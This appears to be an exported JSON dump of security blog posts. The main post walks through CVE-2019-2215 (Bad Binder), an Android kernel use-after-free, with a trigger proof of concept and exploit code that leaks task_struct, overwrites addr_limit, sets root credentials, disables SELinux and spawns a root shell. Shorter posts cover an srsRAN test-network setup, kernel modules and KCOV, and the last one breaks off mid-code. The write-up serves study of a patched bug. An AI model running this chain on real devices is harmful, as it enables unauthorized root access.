[ { "title": "CVE-2019-2215 Bad Binder Writeup", "url": "/posts/bad_binder/", "categories": "android_kernel", "tags": "nday, iovec, addr_limit", "date": "2023-05-27 00:00:00 -0400", "snippet": "OverviewBad Binder (CVE-2019-2215) is a UaF in Binder (Android IPC) and epoll (Async IO). This blog will go over why there is use-after-free (UaF) and how we can use UaF to achieve arbitrary read/w...", "content": "OverviewBad Binder (CVE-2019-2215) is a UaF in Binder (Android IPC) and epoll (Async IO). This blog will go over why there is use-after-free (UaF) and how we can use UaF to achieve arbitrary read/write and perform a Privilege Escalation (PE).ExploitExploit for this writeup will be hosted hereEnvironment SetupSince this bug is in Binder and doesn’t require vendor specific kernel module, we can use goldfish kernel in AVD (Android Emulator Virtual Devices). It will be for Intel x64 CPU but it should work with Arm CPU with minor update since this exploit is data only. Things like fields in structure might be different. HackSysTeam’s Bad Binder Exploitation Workshop. Have good tutorial on how to set this environment.Root Cause AnalysisTL;DR Summary fd = open(\"/dev/binder\", O_RDONLY); Allocates binder_thread.wait which is linked list. epfd = epoll_create(1000); Creates epoll structure. epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event); Will create epoll_entry and set epoll_entry.whead to point to binder_thread.wait ioctl(fd, BINDER_THREAD_EXIT, NULL); Frees binder_thread.wait. Problem is epoll_entry.whead still points to binder_thread.wait. epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL); Will try to unlink epoll_entry by calling __list_del(). This unlinking gives you ability to write 0x10 bytes to where binder_thread.wait was.Trigger PoC// From Project Zero blog // https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html#include &lt;fcntl.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt;#define BINDER_THREAD_EXIT 0x40046208ulint main(){ int fd, epfd; struct epoll_event event = { .events = EPOLLIN }; // Create binder_thread structure fd = open(\"/dev/binder\", O_RDONLY); // size for epoll_create can be any uint32_t &gt; 0 epfd = epoll_create(1000); // Link binder_thread.wait to epoll_entry.whead epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event); // Free binder_thread.wait ioctl(fd, BINDER_THREAD_EXIT, NULL); // Unlink epoll_entry.whead causing UaF epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);}AllocationsHigh Level FlowchartOpening Binder// Create binder_thread structurefd = open(\"/dev/binder\", O_RDONLY);Allocating binder_procflowchart LRf1[\"open\"] --&gt; f2[\"binder_open\"] --&gt; f3[\"kzalloc\"]Allocates struct binder_proc *proc. This will get used to create binder_thread later.Creating epoll// size for epoll_create can be any uint32_t &gt; 0epfd = epoll_create(1000);Allocating eventpollflowchart LRf1[poll_create] --&gt; epoll_create1 --&gt; ep_allocAllocates struct eventpoll *ep. This will eventually create and link epoll_entry when `epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event) is called.Adding Binder to epoll// Link binder_thread.wait to epoll_entry.wheadepoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);Allocating epitem (eventpoll item) and linking to eventpollflowchart LRf1[\"epoll_ctl (EPOLL_CTL_ADD)\"] --&gt; ep_insert --&gt; kmem_cache_allocIf its hasn’t created before, it wil create epi (eventpoll item) and link it to eventpoll.rbr. rbr is red black tree that holds all the epitem.Below given diagram shows how an epitem structure is linked to eventpoll structure. Image is from HackSysTeamAllocating binder_threadContinuing from ep_insert aboveflowchart TDf1[ep_insert] --&gt; f2[\"init_poll_func_ptr(&amp;epq.pt, ep_ptable_queue_proc)\"] --&gt; f3[ep_item_poll] --&gt; f4[binder_poll] --&gt; f5[binder_get_thread] --&gt; f6[kzalloc] init_poll_func_ptr(&amp;epq.pt, ep_ptable_queue_proc) sets epq.pt._qproc to ep_ptable_queue_proc binder_get_thread will allocate binder_threadAllocating eppoll_entryContinuing from binder_poll aboveflowchart TDf1[binder_poll] --&gt; f2[\"poll_wait(flip, &amp;thread-&gt;wait, wait)\"] --&gt; f3[\"p-&gt;_qproc (ep_ptable_queue_proc)\"] --&gt; f4[kmem_cache_alloc] poll_wait pass thread-&gt;wait as parameter. This is list_queue that will be linked to epoll_entry in next step. If you remember this is the pointer where UaF happens p-&gt;_qproc was set as ep_ptable_queue_proc from previous step Linking epitem -&gt; epoll_entry -&gt; binder_threadContinuation from ep_ptable_queue_proc from beforeflowchart TDf1[ep_ptable_queue_proc] --&gt; f2[\"add_wait_queue(whead, &amp;pwq-&gt;wait)\"]f1 --&gt; f3[\"list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist)\"] add_wait_queue will link pwq.wait to binder_thread.wait list_add_tail will link epi.pwqlist to pwq.llinkIt will look something like thisflowchart LRf1[epi.pwqlist] --&gt; pwq.wait --&gt; binder_thread.waitBelow given diagram shows how eventpoll structure is connected with binder_thread structure. Image is from HackSysTeamFree// Free binder_thread.waitioctl(fd, BINDER_THREAD_EXIT, NULL);flowchart TDbinder_ioctl --&gt; binder_thread_release --&gt; binder_thread_dec_tmp_ref --&gt; binder_thread_dec_tmpref --&gt; f1[\"binder_free_thread(thread)\"]This will free binder_thread structureUse after Free (UaF)// Unlink epoll_entry.whead causing UaFepoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);flowchart TDf1[\"epoll_ctl (EPOLL_CTL_DEL)\"]--&gt; ep_remove --&gt; ep_unregister_pollwait --&gt; ep_remove_wait_queue --&gt;remove_wait_queue --&gt; __remove_wait_queue --&gt; uaf[\"list_del(&amp;wq_entry-&gt;entry)\"]wq_entry-&gt;entry is actually pwq-&gt;wait. We know that binder_thread have been freed from previous step. However, it is still trying to call list_del on pwq.wait which is link list pointer to binder_thread.wait.flowchart TDf1[epi.pwqlist] --&gt; fp[\"pwq.wait points to where binder_thread.wait used to be\"]--&gt; fb[\"freed binder_thread.wait\"]list_del operationflowchart LRlist_del --&gt; __list_del_entry --&gt; __list_delstatic inline void __list_del(struct list_head * prev, struct list_head * next){ next-&gt;prev = prev; WRITE_ONCE(prev-&gt;next, next);}next and prev is field of pwq.wait.next-&gt;prev and prev-&gt;next should both point to where binder_thread.wait used to be.Let’s rewrite this so its easier to understandwhere_binder_thread_used_to_be+8 = pwq.wait.prev; // + 8 since prev is 8 bytes after nextwhere_binder_thread_used_to_be = pwq.wait.next;Pretty much it will write address of where_binder_thread_used_to_be into that address.If we can allocate kmalloc that matches binder_thread size and do list_del, we can override the (new_struct+0xa0) and (new_struct+0xa8) with address of nwe_struct+0xa0.*(new_struct+0xa0) = new_struct+0xa0*(new_struct+0xa8) = new_struct+0xa0ExploitationFirst, to use this UaF, we would need to find interesting struct that matches struct binder_thread’s kmalloc size which is kmalloc-512.Vectored I/OVectored I/O (iov) is a way to send multiple buffer with single function. This is great because it will use less syscalls then calling write one by one.Example from Wiki#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/uio.h&gt;int main(int argc, char *argv[]){ const char buf1[] = \"Hello, \"; const char buf2[] = \"Wikipedia \"; const char buf3[] = \"Community!\\n\"; struct iovec bufs[] = { { .iov_base = (void *)buf1, .iov_len = strlen(buf1) }, { .iov_base = (void *)buf2, .iov_len = strlen(buf2) }, { .iov_base = (void *)buf3, .iov_len = strlen(buf3) }, }; if (-1 == writev(STDOUT_FILENO, bufs, sizeof bufs / sizeof bufs[0])) { perror(\"writev()\"); exit(EXIT_FAILURE); } return EXIT_SUCCESS;}output:Hello, Wikipedia Community!Vectored I/O InternalsThe reason why iovec is interesting is due to how array of struct iovec gets allocated in kernel. For example above, will create kmalloc-64 (in Linux) and kmalloc-128 (In Android. Smallest cache size). Therefore, if we can make enough iovecs we should be able to allocate kmalloc-512 to get placed on where binder_thread used to be.Allocating Any kmalloc sizestruct iovec is 16 bytes.struct iovec{ void __user *iov_base; /* BSD uses caddr_t (1003.1g requires void *) */ __kernel_size_t iov_len; /* Must be size_t (1003.1g) */};When you call writev with array of iovec, it will eventually call rw_copy_check_uvector and it will kmalloc with size nr_segs*sizeof(struct iovec) where nr_segs being number of iovec and sizeof(struct iovec).Meaning we can create any size kmalloc cache with writevflowchart TDwritev --&gt; vfs_writev --&gt; import_iovec --&gt; f1[\"rw_copy_check_uvector\"] --&gt; rw_copy_check_uvector --&gt; f2[\"iov = kmalloc(nr_segs*sizeof(struct iovec), GFP_KERNEL)\"]Leaking task_structvoid BadBinder::leak_task_struct()High Level View of leaking task_struct from P0Initializing for task_struct leak// Creates mmap with addr 0x1_0000_0000 and set m_lock_pagecreate_lock_page(); int pipe_fd[2] = {0};char data_buffer[PAGE_SIZE] = {0};// struct iovec iovecs[25] = {0};int binder_fd = open_binder();int epfd = create_epoll();pipe(pipe_fd);fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE)iovecs[10].iov_base = m_lock_page; // binder_thread-&gt;wait.lockiovecs[10].iov_len = PAGE_SIZE; // binder_thread-&gt;wait.head.nextiovecs[11].iov_base = (void *)0x41414141; // binder_thread-&gt;wait.head.previovecs[11].iov_len = PAGE_SIZE;epoll_add(epfd, binder_fd);create_lock_page()void BadBinder::create_lock_page(){ m_lock_page = mmap( (void *)0x100000000ul, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);}Sets BadBinder::m_lock_page to 0x1_0000_0000 (Lower 32bit are all 0s). Reason being binder_thread.wait.lock’s lower 32bit needs to be all 0 or else cpu will just get locked.struct wait_queue_head { spinlock_t\t\tlock; struct list_head\thead;};Creating iovecsstruct iovec iovecs[25] = {0};Create struct iovec iovecs[25]. 25 * 16 (sizeof(iovec)) = 400 bytes which means it will be allocated in kmalloc-512. There is reason why it is 400. This will be explained later.Allocate binder and epoll structint binder_fd = open_binder();int epfd = create_epoll();We need these so that it can create struct binder_thread and struct eventpollCreate pipespipe(pipe_fd);fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE)Create a pipe so we can have IPC between parent and child from fork. Then set pipe size to PAGE_SIZE (0x1000). For each read, it will be PAGE_SIZE.Set iovecsiovecs[10].iov_base = m_lock_page; // binder_thread-&gt;wait.lockiovecs[10].iov_len = PAGE_SIZE; // binder_thread-&gt;wait.head.nextiovecs[11].iov_base = (void *)0x41414141; // binder_thread-&gt;wait.head.previovecs[11].iov_len = PAGE_SIZE;Set iovecs so that it aligns with binder_thread.wait which is iovecs[10]. Here we set the wait.lock to our mmap address with lower 32 bit all 0 so that it doesn’t lock unlinking. Also we should be able to read m_lock_page since we allocated it with PAGE_SIZE.Then we set iovecs[11].iov_base to any junk. This shouldn’t matter. iovecs[11].iov_len, we will set PAGE_SIZE. This is set to PAGE_SIZE but it doesn’t have to be this big since we only need to leak up to sizeof(struct binder_thread - 0xA0).Remember when we do unlinking by calling epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, NULL);, operation will be something like below// list_del dump during unlinking// __list_del// next: 0xffff88803a8fcca8 (addr eppoll_event.wait.next pointing to )// prev: 0xffff88803a8fcca8// next-&gt;prev: 0x0000000041414141// prev-&gt;next: 0x0000000000001000// next-&gt;prev = prev// prev-&gt;next = nextwhich is equivalent to//0xa8 since 0xa0 is where binder_thread.wait.lock is. wait.next is 0xa8*(iovecs_kmalloc_ptr+0xa0) = iovecs_kmalloc_ptr+0xa8 *(iovecs_kmalloc_ptr+0xa8) = iovecs_kmalloc_ptr+0xa8Linking binder_thread and eppoll_eventepoll_add(epfd, binder_fd);Connecting structure together. Explained at Linking epitem -&gt; epoll_entry -&gt; binder_threadForkingpid_t leak_pid = fork();We will now have child and parent happening at same time. But first we will look at parent because child will sleep(2).(Parent Process) Free binder_thread and Allocate Iovecsbinder_thread_exit(binder_fd);// Should wrote PAGE_SIZE*2 since we have two iovec with PAGE_SIZEwritev(pipe_fd[1], iovecs, IOVEC_COUNT);This will free binder_thread which will leave kmalloc-512 cache freed. We fill that address with our iovecs by doing writevwritev should be blocking until child does read with PAGE_SIZE since we set pipe to PAGE_SIZE(Child Process) Cause unlinkingsleep(2); // Block so parent can setup iovecs kmallocepoll_del(epfd, binder_fd); // Cause Unlinking (list_del)read(pipe_fd[0], data_buffer, PAGE_SIZE); // Should read PAGE_SIZEexit(EXIT_SUCCESS);At this state, we should have caused where binder_thread used to be with our iovecs.Calling epoll_del will cause unlinking. Then we call read so that parent’s writev gets unblocked and exit.It should have done operation below//0xa8 since 0xa0 is where binder_thread.wait.lock is. wait.next is 0xa8iovecs[10].iov_len = iovecs_kmalloc_ptr+0xa8 iovecs[11].iov_base = iovecs_kmalloc_ptr+0xa8(Parent Process) Read task_struct// Read iovecs[11]read(pipe_fd[0], data_buffer, PAGE_SIZE);// Wait till child exitwait(nullptr);// TASK_STRUCT_OFFSET_IN_LEAKED_DATA == 0xe8struct task_struct *task = (struct task_struct *)*((int64_t *)(data_buffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA));data_buffer hexdump// dump after leak read0x000000: a8 cc 8f 3a 80 88 ff ff a8 cc 8f 3a 80 88 ff ff ...:.......:....0x000010: 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ [...]0x0000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................0x0000e0: 00 00 00 00 00 00 00 00 00 ee 81 3a 80 88 ff ff ...........:....struct binder_threadstruct binder_thread { struct binder_proc *proc; [...] wait_queue_head_t wait; // offset 160 (0xa0) { .lock // offset 160 (0xa0) .next // offset 168 (0xa8) .prev // offset 175 (0xb0) } [...] struct task_struct *task; // offset 400 (0x190)};When we read the data, it will be from where binder_thread.wait.next used to be which is offset 0xa8. If you want to to get to task_struct you would need to get uint64_t of data_buffer+0xe8. 0xe8 is from task_struct_offset (0x190)- wait.next (0xa8).Overriding addr_limitIn task_struct there is a field named addr_limit which is used to validate where user process can write/read to/from. We know that higher virtual address is used for kernel address. If we can override this field with 0xFFFFFFFFFFFFFFFE, we should be able to write to any address giving us Arbitary R/W. The reason why it is 0xFFFFFFFFFFFFFFFE instead of 0xFFFFFFFFFFFFFFFF is explained in these blog. duasyntand HackSysTeamAnother gotcha are that we can’t use readv to write to our iovecs. The reason being is that readv will not process one iovec. This means that when you try to read data to iovecs, it will try to copy all sum of iov_len to iovecs[10].iov_base. And if you remember from Child Process Cause unlinking, iovecs[10].iov_len becomes binder_thread_ptr which is really big number. Therefore, it will just skip out on processing iovecs[11].iov_iter.c readvstatic size_t copy_page_to_iter_iovec(struct page *page, size_t offset, size_t bytes, struct iov_iter *i){ size_t skip, copy, left, wanted; const struct iovec *iov; char __user *buf; void *kaddr, *from; [...] while (unlikely(!left &amp;&amp; bytes)) { iov++; buf = iov-&gt;iov_base; copy = min(bytes, iov-&gt;iov_len); left = copyout(buf, from, copy); [...] } [...] return wanted - bytes;}In Project Zero blog, they use recvmsg instead since it allows blocking by passing MSG_WAITALL flag.Initializing for Overriding addr_limitstruct msghdr message = {nullptr};struct iovec iovecs[IOVEC_COUNT] = {nullptr};int sock_fd[2] = {0};int binder_fd = open_binder();int epfd = create_epoll();socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd);static char junk_sock_data[] = {0x41};write(sock_fd[1], junk_sock_data, sizeof(junk_sock_data));// should sent 1 bytesSimilar setup to initializing for task_struct leak. Difference is we use socketpair instead of pipe so we can use recvmsg. Also, we have to send some junk data so that when recvmsg is called, it processes the junk data and kmalloc iovecs in kernel.Setting up iovecsiovecs[10].iov_base = m_lock_page; // binder_thread-&gt;wait.lockiovecs[10].iov_len = 1; // binder_thread-&gt;wait.head.nextiovecs[11].iov_base = (void *)0x41414141; // binder_thread-&gt;wait.head.previovecs[11].iov_len = 0x8 + 0x8 + 0x8 + 0x8;iovecs[12].iov_base = (void *)0x42424242;iovecs[12].iov_len = 0x8;uint64_t addr_limit_ptr = (uint64_t)((uint8_t *)m_task_struct_ptr + OFFSET_TASK_STRUCT_ADDR_LIMIT);info(\"\\taddr_limit_ptr: 0x%lx\", addr_limit_ptr);static uint64_t override_binder_thread_wait[] = { 0x1, // iovecStack[IOVEC_WQ_INDEX].iov_len 0x41414141, // iovecStack[IOVEC_WQ_INDEX + 1].iov_base 0x8 + 0x8 + 0x8 + 0x8, // iovecStack[IOVEC_WQ_INDEX + 1].iov_len addr_limit_ptr, // iovecStack[IOVEC_WQ_INDEX + 2].iov_base 0xFFFFFFFFFFFFFFFE // addr_limit value. It will be written to addr_limit_ptr above};message.msg_iov = iovecs;message.msg_iovlen = IOVEC_COUNT;iovecs[10].iov_base = m_lock_page; // binder_thread-&gt;wait.lockiovecs[10].iov_len = 1; // binder_thread-&gt;wait.head.nextFirst iovec that gets read is iovecs[10] . And it has iov_len of 1. This is so that when we do call recvmsg(sock_fd[0], &amp;message, MSG_WAITALL);. It processes our junk data write ` write(sock_fd[1], junk_sock_data, sizeof(junk_sock_data));`.iovecs[11].iov_base = (void *)0x41414141; // binder_thread-&gt;wait.head.previovecs[11].iov_len = 0x8 + 0x8 + 0x8 + 0x8;Second iovec that will get read will be from child process after they do unlinking.iovecs[IOVEC_WQ_INDEX + 2].iov_base = (void *)0x42424242;iovecs[IOVEC_WQ_INDEX + 2].iov_len = 0x8;Third iovec will be used to override addr_limit. iov_base: 0x42424242 will be replace with addr_limit_ptr address in child process. It will go over more about this down the road.Linking binder_thread and eppoll_eventepoll_add(epfd, binder_fd);Connecting structure together. Explained at Linking epitem -&gt; epoll_entry -&gt; binder_threadForkingpid_t child_pid = fork();We will now have child and parent happening at same time. But first we will look at parent because child will sleep(2).(Parent) Free binder_thread and block via recvmsgbinder_thread_exit(binder_fd);// Should recv sum of all iov_lenssize_t bytes_received = recvmsg(sock_fd[0], &amp;message, MSG_WAITALL);wait(nullptr);Frees binder_thread and waits for all iovecs to be write from child process. Currently, it processed iovecs[10] which is junk data with iov_len of 1.(Child) Unlink then write to iovecs[11]static uint64_t override_binder_thread_wait[] = {0x1, // iovecs[10].iov_len0x41414141, // iovecx[11].iov_base0x8 + 0x8 + 0x8 + 0x8, // iovecx[11].iov_lenaddr_limit_ptr, // iovecs[12].iov_base0xFFFFFFFFFFFFFFFE // addr_limit value. It will be written to addr_limit_ptr above};sleep(2);epoll_del(epfd, binder_fd);write(sock_fd[1], override_binder_thread_wait, sizeof(override_binder_thread_wait));exit(EXIT_SUCCESS);It is similar to (Child Process) Cause unlinking. But we will write to recvmsg after unlinking and iovecs will look something like below after we write.Interesting part is that our second iovec we are planned to write (0x8 * 4) == 32 bytes.iovecs[11].iov_base = (void *)0x41414141; // binder_thread-&gt;wait.head.previovecs[11].iov_len = 0x8 + 0x8 + 0x8 + 0x8;But we send (0x8 * 5) == 40 bytes (sizeof(struct override_binder_thread_wait)). The reason is first 32 bytes will be written to binder_thread.wait which is actually where iovecs[10].iov_len is. So we have to make sure we override the area with same data except override iovecs[12].iov_base with addr_limit_ptr.The extra write which is 0xFFFFFFFFFFFFFFFE will store that in iovecs[1].iov_base which is now addr_limit_ptr.Red is where it have been replaced with override_binder_thread_wait(Parent) Unblocked recvmsgssize_t bytes_received = recvmsg(sock_fd[0], &amp;message, MSG_WAITALL);ssize_t expected_bytes_received = iovecs[10].iov_len + iovecs[11].iov_len + iovecs[12].iov_len;if (bytes_received != expected_bytes_received){ err(\"\\tbytes_received: 0x%lx, expected: 0x%lx\", bytes_received, expected_bytes_received);}wait(nullptr);Since child process have sent correct amount of bytes write, it should have been unblocked. Also we have addr_limit_ptr to set to 0xFFFFFFFFFFFFFFFEArbitrary R/WSince we have overwritten addr_limit we should be able to write and read anywhere.void BadBinder::arb_read(char *buf, char *addr, size_t size){ info(\"arb_read: addr: 0x%lx, size: 0x%lx\", addr, size); // write to pipe if (write(m_rw_pipes[1], addr, size) != size) { err(\"\\tUnable to write to pipe\"); } // read from pipe if (read(m_rw_pipes[0], buf, size) != size) { err(\"\\tUnable to read from pipe\"); }}void BadBinder::arb_write(char *addr, char *buf, size_t size){ info(\"arb_write: addr: 0x%lx, size: 0x%lx\", addr, size); // write to pipe if (write(m_rw_pipes[1], buf, size) != size) { err(\"\\tUnable to write to pipe\"); } // read from pipe if (read(m_rw_pipes[0], addr, size) != size) { err(\"\\tUnable to read from pipe\"); }}Here we just use pipe because its convenient to use pipe to write and read then opening something like file to pass to write and read. You can just use STDOUT or STDIN FD to do this as well but then it will just write/recv from terminal which is not ideal.Getting Kernel Base to get selinux_enforcing AddressSince we now have arbitary R/W as well as task_struct_ptr, we should be able to get kernel base by reading nsproxy field of task_struct by substracting nsproxy_ptr - nsproxy_offset_to_kbase).void BadBinder::get_kbase(){ info(\"Getting kaslr base by leaking nsproxy from task_struct\"); uint64_t nsproxy = read_u64((uint64_t)m_task_struct_ptr + offsetof(struct task_struct, nsproxy)); info(\"nsproxy: 0x%lx\", nsproxy); m_kbase = nsproxy - NSPROXY_OFFSET_FROM_KBASE_TEXT; info(\"kbase: 0x%lx\", m_kbase); m_selinux_enforcing = m_kbase + SELINUX_ENFORCING_OFFSET; info(\"selinux_enforing addr: 0x%lx\", m_selinux_enforcing);}Overriding task_struct.cred with init_cred// struct cred init_cred = {// .usage = ATOMIC_INIT(4),// .uid = GLOBAL_ROOT_UID,// .gid = GLOBAL_ROOT_GID,// .suid = GLOBAL_ROOT_UID,// .sgid = GLOBAL_ROOT_GID,// .euid = GLOBAL_ROOT_UID,// .egid = GLOBAL_ROOT_GID,// .fsuid = GLOBAL_ROOT_UID,// .fsgid = GLOBAL_ROOT_GID,// .securebits = SECUREBITS_DEFAULT,// .cap_inheritable = CAP_EMPTY_SET,// .cap_permitted = CAP_FULL_SET,// .cap_effective = CAP_FULL_SET,// .cap_bset = CAP_FULL_SET,// .user = INIT_USER,// .user_ns = &amp;init_user_ns,// .group_info = &amp;init_groups,// };void BadBinder::override_cred_with_init_cred(){ info(\"Overriding cred with init_cred\"); uint64_t cur_cred_ptr = (uint64_t)m_task_struct_ptr+ offsetof(struct task_struct, cred); info(\"\\ttask_struct: 0x%lx\", m_task_struct_ptr); info(\"\\tcred_offset: 0x%lx\", offsetof(struct task_struct, cred)); info(\"\\tcred: 0x%lx\", cur_cred_ptr); uint64_t cur_cred = read_u64(cur_cred_ptr); info(\"\\tcur_cred: 0x%lx\", cur_cred); write_u64(cur_cred + offsetof(struct cred, uid), GLOBAL_ROOT_UID); write_u64(cur_cred + offsetof(struct cred, gid), GLOBAL_ROOT_GID); write_u64(cur_cred + offsetof(struct cred, suid), GLOBAL_ROOT_UID); write_u64(cur_cred + offsetof(struct cred, sgid), GLOBAL_ROOT_GID); write_u64(cur_cred + offsetof(struct cred, euid), GLOBAL_ROOT_UID); write_u64(cur_cred + offsetof(struct cred, egid), GLOBAL_ROOT_GID); write_u64(cur_cred + offsetof(struct cred, fsuid), GLOBAL_ROOT_UID); write_u64(cur_cred + offsetof(struct cred, fsgid), GLOBAL_ROOT_GID); write_u64(cur_cred + offsetof(struct cred, securebits), SECUREBITS_DEFAULT); write_u64(cur_cred + offsetof(struct cred, cap_inheritable), CAP_EMPTY_SET); write_u64(cur_cred + offsetof(struct cred, cap_permitted), CAP_FULL_SET); write_u64(cur_cred + offsetof(struct cred, cap_effective), CAP_FULL_SET); write_u64(cur_cred + offsetof(struct cred, cap_bset), CAP_FULL_SET); write_u64(cur_cred + offsetof(struct cred, cap_ambient), CAP_EMPTY_SET);}Since we have arb r/w just imitate commit_creds(prepare_kernel_cred(0)).Disable selinux_enforcingvoid BadBinder::override_selinux_enforcing(){ info(\"Overriding selinux_enforcing\"); write_u32(m_selinux_enforcing, 0);}To disable selinux, we just disable it by writing 0 to selinux_enforcing which is uint32_tSpawn Shellvoid BadBinder::spawn_shell(){ info(\"Spawning shell\"); system(\"/bin/sh\");}Spawn shell on same process and we should have root as well as disabled selinux!Closing StatementThis was my first introduction to Android Kernel Exploitation. Before this, I have done some Linux Kernel exploitation and it seems pretty similar to it except with less kernel structure I can call which makes it harder. Also big shout out to HackSysTeam. With their workshop I realize how visualization and neat code organization can make you understand how exploitation works way easier.ResourcesBad Binder Google Project Zero Writeup HackSysTeam Bad Binder Explotation WorkshopVector I/O AoE Unconventional UaFArm MitigationsUAO and PAN https://duasynt.com/blog/android-uao-kernel-expl-mitigation" }, { "title": "srsRan 4G Setup", "url": "/posts/srsran-4g-setup/", "categories": "baseband", "tags": "setup", "date": "2023-05-22 00:00:00 -0400", "snippet": "Hardware BladeRfMicro A4 sysmocom sim Card reader Omnikey CardMan or MCR3512Software Ubuntu 22.04 VMware WorkstationInstall Ubuntu in VMwarechange usb setting USB Compatibility to USB 3.1Upda...", "content": "Hardware BladeRfMicro A4 sysmocom sim Card reader Omnikey CardMan or MCR3512Software Ubuntu 22.04 VMware WorkstationInstall Ubuntu in VMwarechange usb setting USB Compatibility to USB 3.1Update/Match IMSI with MCC/MNCpushing mcc mnc and changing the imsi to matchthe first five digit of sim card need to match mcc mnc . for us its 001 01 (test network)Example Config./pySim-prog.py -p 0 -t sysmoISIM-SJA2 -a 89907613 -x 001 -y 01 -i 001010000052250 -s 8988211000002592504 -o F6CA46797341FC2B2FCA22CF0C165D4B -k 9BA13241D5D4A8B2466BA4EF19A1B971 Install BladeRFDependenciesPrograms will silently fail if you don’t have these dependencies# deps for commonsudo apt install libusb-1.0.0-dev libusb-1.0.0 build-essential cmakehttps://github.com/Nuand/bladeRF/tree/master/hostTesting if bladeRf WorksIn terminal, typebladeRf-cli -pShould look similar to belowFetch the lastest FPGA imageget the fpga hereI have the BladeRF A4 so I will install it using A4 but replace command below with your own FPGAwget https://www.nuand.com/fpga/hostedxA4-latest.rbf # make sure you use your fpga versionbladeRF-cli -L ./hostedxA4-latest.rbfFetch the lastest firmware imageget the firmware herewget https://www.nuand.com/fx3/bladeRF_fw_latest.imgbladeRF-cli -f ./bladeRF_fw_latest.imgThen power cycle the SDR to load the firmwareCheck if everything is loadedbladeRF-cli -e info -e versionInstalling srsRanWe need to compile srsRan from source. Follow this documentationhttps://docs.srsran.com/projects/4g/en/latest/general/source/1_installation.htmlUpdating ConfigUpdate user_db.csvUpdate user_db.csv with your sim card imsi and ki like example https://github.com/srsran/srsRAN_4G/blob/master/srsepc/user_db.csv.exampleRunningFolow this. TLDR you have to https://docs.srsran.com/projects/4g/en/latest/usermanuals/source/1_setup.htmlDiagnosticTo check your mobile card setting on andriod you can dial*#*#4636#*#*Can’t find Mobile Network?On your enb.conf for me it was /root/.config/srsran/enb.conf look for dl_earfcn under [rf]. Change values to 800, 1800, 2600 One of those and see if apn will show up. Samsung Basebands are usually very annoying when it comes to these.For Pixel 7 it was 2600" }, { "title": "Loadable Kernel Modules", "url": "/posts/loadable_kernel_modules/", "categories": "linux_kernel", "tags": "setup", "date": "2023-05-08 00:00:00 -0400", "snippet": "OverviewWhether you are fuzzing or looking into certain Linux subsystems, you might need to set up a loadable kernel module if you selected m option on kernel config. An example would be something ...", "content": "OverviewWhether you are fuzzing or looking into certain Linux subsystems, you might need to set up a loadable kernel module if you selected m option on kernel config. An example would be something like Netfilter which would load that module when you use them dynamically. If you do an lsmod you should be able to see some of loadable kernel modules like nfnetlink (Netfilter component). These aren’t automatically there when you follow this syzkaller guide. In this blog, we will compile kernel and setup Qemu image so that it can load these modules.lsmodmodinfoCompiling Kernel and ImageJust follow this syzkaller guide. By default, Debian image created by create-image.sh will be 2G. Sometimes, this is not big enough especially if you compile the kernel with something like Ubuntu config. You can actually expand this image by doing qemu-img resize stretch.img +20G (This will increase the image size by 20G but you can change the number).Then you should also increase the size insize linux guest. with tools like parted and resize2fsparted /dev/sda resizepart 1 100%resize2fs /dev/sdaCompiling Kernel ModulesYou need to compile Linux kernel module by doingmake modulesThen Save it by doing the command below. You can replace INSTALL_MOD_PATH with the path you want.INSTALL_MOD_PATH=./linux_modules make modules_installThen move the linux_modules folder to Qemu host using scp.In guest Linux, move the /lib folder under linux_modules to system /lib. It should look something like below. Note that the folder path needs to match uname -rOnce that is done do and restart.depmod -aIf you do lsmod, it should have bunch of loadable modules if your kernel is expecting loadable kernel modules." }, { "title": "Visualizing KCOV with syz-cover", "url": "/posts/kcov-syz-cover/", "categories": "fuzzing", "tags": "syzkaller, kcov, syz-cover", "date": "2023-04-27 00:00:00 -0400", "snippet": "OverviewIf you have used syzkaller, you seen how they have visualizer for kernel coverage. You can actually use syz-cover to do this with any kcov.Syzkaller Coverage ViewerBuilding syz-coverPrereqI...", "content": "OverviewIf you have used syzkaller, you seen how they have visualizer for kernel coverage. You can actually use syz-cover to do this with any kcov.Syzkaller Coverage ViewerBuilding syz-coverPrereqIf you never installed syzkaller before follow this guideBuild syz-cover (cover)git clone https://github.com/google/syzkallercd syzkallermake cover syz-cover should be under syzkaller/bin.Building Kernel and Running it on QEMUFollow syzkaller (guide)[https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md] to setup the environment. Most important part is making sure to enable CONFIG_KCOV=y in kernel config.Building Test ProgramI will be using modified version of code shown in official kcov guideCode it will try to get kernel coverage for is read(-1, NULL, 0);Modification is we subtract 5 from kcov address, which effectively gives us the previous instruction. kcov by default gives you addres after CALL __sanitizer_cov_trace_pc but syz-cover parses address at CALL instruction. 5 bytes come from CALL sanitizer_cov_trace_pc being 5 bytes.Code that calculates the PreviousInstructionPC is hereCopy this code below and compile it by doing g++ -static -o kcov_test kcov_test.cckcov_test.cc#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;linux/types.h&gt;#include &lt;iostream&gt;#include &lt;fstream&gt;#define 